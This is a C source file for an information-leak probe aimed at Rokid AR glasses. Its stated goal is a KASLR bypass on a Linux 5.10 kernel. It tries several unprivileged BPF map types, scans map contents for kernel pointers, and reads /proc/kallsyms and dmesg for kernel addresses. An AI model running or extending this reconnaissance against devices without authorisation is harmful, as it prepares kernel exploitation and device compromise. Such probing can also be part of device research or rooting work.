/*
 * BPF Information Leak Probe for Rokid AR Glasses
 *
 * 目標: 利用 BPF 進行 KASLR 繞過和內核信息洩漏
 * 設備: Linux 5.10.209-perf, unprivileged_bpf_disabled=0
 *
 * 策略:
 * 1. 使用 BPF_MAP_TYPE_STACK_TRACE 洩漏內核棧地址
 * 2. 使用 BPF_PROG_TYPE_SOCKET_FILTER 進行 map 操作
 * 3. 分析 map value 中的內核指針
 *
 * 編譯:
 * $NDK/toolchains/llvm/prebuilt/windows-x86_64/bin/aarch64-linux-android31-clang.cmd -static -O2 -o bpf_leak bpf_info_leak.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <fcntl.h>

#ifndef __NR_bpf
#define __NR_bpf 280
#endif

/* BPF Commands */
#define BPF_MAP_CREATE 0
#define BPF_MAP_LOOKUP_ELEM 1
#define BPF_MAP_UPDATE_ELEM 2
#define BPF_MAP_DELETE_ELEM 3
#define BPF_MAP_GET_NEXT_KEY 4
#define BPF_PROG_LOAD 5
#define BPF_OBJ_PIN 6
#define BPF_OBJ_GET 7
#define BPF_PROG_ATTACH 8
#define BPF_PROG_DETACH 9

/* BPF Map Types */
#define BPF_MAP_TYPE_HASH 1
#define BPF_MAP_TYPE_ARRAY 2
#define BPF_MAP_TYPE_PERF_EVENT_ARRAY 4
#define BPF_MAP_TYPE_STACK_TRACE 7
#define BPF_MAP_TYPE_RINGBUF 27

/* BPF Program Types */
#define BPF_PROG_TYPE_SOCKET_FILTER 1
#define BPF_PROG_TYPE_KPROBE 2
#define BPF_PROG_TYPE_TRACEPOINT 5

/* BPF Instruction */
struct bpf_insn
{
    uint8_t code;
    uint8_t dst_reg : 4;
    uint8_t src_reg : 4;
    int16_t off;
    int32_t imm;
};

/* BPF Attr union */
union bpf_attr
{
    struct
    {
        uint32_t map_type;
        uint32_t key_size;
        uint32_t value_size;
        uint32_t max_entries;
        uint32_t map_flags;
    };
    struct
    {
        uint32_t prog_type;
        uint32_t insn_cnt;
        uint64_t insns;
        uint64_t license;
        uint32_t log_level;
        uint32_t log_size;
        uint64_t log_buf;
        uint32_t kern_version;
    };
    struct
    {
        uint32_t map_fd;
        uint64_t key;
        union
        {
            uint64_t value;
            uint64_t next_key;
        };
        uint64_t flags;
    };
} __attribute__((aligned(8)));

static inline int bpf(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

/* BPF 指令宏 */
#define BPF_LD_IMM64(DST, IMM)                                                                         \
    ((struct bpf_insn){.code = 0x18, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = (uint32_t)(IMM)}), \
        ((struct bpf_insn){.code = 0, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = (uint32_t)((IMM) >> 32)})

#define BPF_MOV64_IMM(DST, IMM) \
    ((struct bpf_insn){.code = 0xb7, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})

#define BPF_EXIT_INSN() \
    ((struct bpf_insn){.code = 0x95, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0})

int create_map(uint32_t type, uint32_t key_size, uint32_t value_size, uint32_t max_entries)
{
    union bpf_attr attr = {
        .map_type = type,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries,
    };
    return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

int map_update(int fd, void *key, void *value, uint64_t flags)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
        .flags = flags,
    };
    return bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

int map_lookup(int fd, void *key, void *value)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
    };
    return bpf(BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

int load_prog(struct bpf_insn *insns, int insn_cnt, char *log_buf, int log_size)
{
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insn_cnt = insn_cnt,
        .insns = (uint64_t)insns,
        .license = (uint64_t)"GPL",
        .log_level = log_buf ? 1 : 0,
        .log_size = log_size,
        .log_buf = (uint64_t)log_buf,
    };
    return bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
}

void hexdump(const char *desc, const void *data, size_t size)
{
    const uint8_t *p = data;
    printf("%s (%zu bytes):\n", desc, size);
    for (size_t i = 0; i < size; i++)
    {
        if (i % 16 == 0)
            printf("  %04zx: ", i);
        printf("%02x ", p[i]);
        if ((i + 1) % 16 == 0)
            printf("\n");
    }
    if (size % 16)
        printf("\n");
}

void scan_kernel_pointers(const void *data, size_t size, const char *desc)
{
    const uint64_t *p = data;
    size_t count = size / 8;

    printf("[*] Scanning %s for kernel pointers...\n", desc);

    for (size_t i = 0; i < count; i++)
    {
        uint64_t val = p[i];

        // ARM64 內核地址通常在 0xffff... 範圍
        if ((val >> 48) == 0xffff)
        {
            printf("[!] Possible kernel pointer at offset %zu: 0x%016lx\n", i * 8, val);
        }
        // 或者在某些配置下可能是其他範圍
        else if ((val >> 56) == 0xff && val != 0xffffffffffffffff)
        {
            printf("[?] Suspicious value at offset %zu: 0x%016lx\n", i * 8, val);
        }
    }
}

int try_stack_trace_map(void)
{
    printf("\n=== Strategy 1: BPF_MAP_TYPE_STACK_TRACE ===\n");

    int fd = create_map(BPF_MAP_TYPE_STACK_TRACE, 4, 127 * 8, 256);
    if (fd < 0)
    {
        printf("[-] STACK_TRACE map creation failed: %s\n", strerror(errno));
        return -1;
    }

    printf("[+] STACK_TRACE map created: fd=%d\n", fd);
    close(fd);
    return 0;
}

int try_array_map_leak(void)
{
    printf("\n=== Strategy 2: Array Map Uninitialized Memory ===\n");

    // 創建一個較大的 array map
    int fd = create_map(BPF_MAP_TYPE_ARRAY, 4, 4096, 16);
    if (fd < 0)
    {
        printf("[-] Array map creation failed: %s\n", strerror(errno));
        return -1;
    }

    printf("[+] Array map created: fd=%d\n", fd);

    // 嘗試讀取未初始化的 entries
    uint8_t value[4096];

    for (int key = 0; key < 16; key++)
    {
        memset(value, 0, sizeof(value));

        if (map_lookup(fd, &key, value) == 0)
        {
            // 檢查是否有非零數據
            int non_zero = 0;
            for (int i = 0; i < 4096; i++)
            {
                if (value[i] != 0)
                    non_zero++;
            }

            if (non_zero > 0)
            {
                printf("[!] Key %d has %d non-zero bytes!\n", key, non_zero);
                scan_kernel_pointers(value, 4096, "array value");
            }
        }
    }

    close(fd);
    return 0;
}

int try_ringbuf_leak(void)
{
    printf("\n=== Strategy 3: BPF_MAP_TYPE_RINGBUF ===\n");

    // 嘗試創建 ringbuf (需要較新內核)
    union bpf_attr attr = {
        .map_type = BPF_MAP_TYPE_RINGBUF,
        .key_size = 0,
        .value_size = 0,
        .max_entries = 4096, // page size
    };

    int fd = bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
    if (fd < 0)
    {
        printf("[-] Ringbuf creation failed: %s\n", strerror(errno));
        return -1;
    }

    printf("[+] Ringbuf created: fd=%d\n", fd);
    close(fd);
    return 0;
}

int try_perf_array_leak(void)
{
    printf("\n=== Strategy 4: BPF_MAP_TYPE_PERF_EVENT_ARRAY ===\n");

    int fd = create_map(BPF_MAP_TYPE_PERF_EVENT_ARRAY, 4, 4, 256);
    if (fd < 0)
    {
        printf("[-] Perf event array creation failed: %s\n", strerror(errno));
        return -1;
    }

    printf("[+] Perf event array created: fd=%d\n", fd);
    close(fd);
    return 0;
}

int try_simple_prog(void)
{
    printf("\n=== Strategy 5: Load Simple BPF Program ===\n");

    struct bpf_insn prog[] = {
        BPF_MOV64_IMM(0, 0), // r0 = 0
        BPF_EXIT_INSN(),     // return r0
    };

    char log_buf[65536];
    memset(log_buf, 0, sizeof(log_buf));

    int fd = load_prog(prog, 2, log_buf, sizeof(log_buf));

    if (fd < 0)
    {
        printf("[-] Program load failed: %s\n", strerror(errno));
        printf("[*] Verifier log:\n%s\n", log_buf);
        return -1;
    }

    printf("[+] BPF program loaded: fd=%d\n", fd);
    close(fd);
    return 0;
}

int try_proc_kallsyms(void)
{
    printf("\n=== Strategy 6: Check /proc/kallsyms ===\n");

    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f)
    {
        printf("[-] Cannot open /proc/kallsyms: %s\n", strerror(errno));
        return -1;
    }

    char line[256];
    int count = 0;
    int non_zero = 0;

    while (fgets(line, sizeof(line), f) && count < 10)
    {
        uint64_t addr;
        if (sscanf(line, "%lx", &addr) == 1)
        {
            if (addr != 0)
            {
                non_zero++;
                printf("[+] %s", line);
            }
        }
        count++;
    }

    fclose(f);

    if (non_zero == 0)
    {
        printf("[-] All addresses are 0 (kptr_restrict is enabled)\n");
    }

    return 0;
}

int try_dmesg_leak(void)
{
    printf("\n=== Strategy 7: Check dmesg for addresses ===\n");

    FILE *f = popen("dmesg 2>/dev/null | grep -E 'ffff|[0-9a-f]{16}' | tail -10", "r");
    if (!f)
    {
        printf("[-] Cannot run dmesg: %s\n", strerror(errno));
        return -1;
    }

    char line[512];
    while (fgets(line, sizeof(line), f))
    {
        printf("%s", line);
    }

    pclose(f);
    return 0;
}

int main(int argc, char *argv[])
{
    printf("=================================================\n");
    printf("  BPF Information Leak Probe for Rokid Glasses\n");
    printf("  Kernel: 5.10.209-perf\n");
    printf("=================================================\n");

    // 檢查 BPF 是否可用
    printf("\n[*] Checking BPF availability...\n");

    int fd = create_map(BPF_MAP_TYPE_HASH, 4, 4, 1);
    if (fd < 0)
    {
        printf("[-] BPF not available: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] BPF is available!\n");
    close(fd);

    // 執行各種洩漏策略
    try_proc_kallsyms();
    try_dmesg_leak();
    try_stack_trace_map();
    try_array_map_leak();
    try_ringbuf_leak();
    try_perf_array_leak();
    try_simple_prog();

    printf("\n[*] Probe complete.\n");
    return 0;
}
